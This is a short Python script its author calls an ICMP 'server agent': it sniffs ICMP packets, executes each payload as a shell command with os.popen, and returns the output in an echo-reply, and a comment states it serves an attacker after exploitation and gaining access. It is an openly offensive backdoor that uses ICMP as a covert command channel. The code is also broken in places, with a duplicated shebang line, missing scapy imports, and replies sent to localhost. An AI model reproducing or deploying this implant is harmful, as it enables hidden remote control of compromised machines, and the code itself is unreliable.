
// this is the icmp server aget code i used to write with python
#!/usr/bin/env python3#!/usr/bin/env python3

import os
import scapy,sys


def main():

    while True:
        
        pack_sniffer = sniff(filter="icmp", count=1)
    
        var = pack_sniffer[0][Raw].load.decode('utf-8')
   
        res = os.popen(var).read()
        # the structure for icmp packet 
        # this command give a command execution result to the attacker after exploitation and gaining access .
        
        send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)

		
if __name__ == "__main__":
    main()
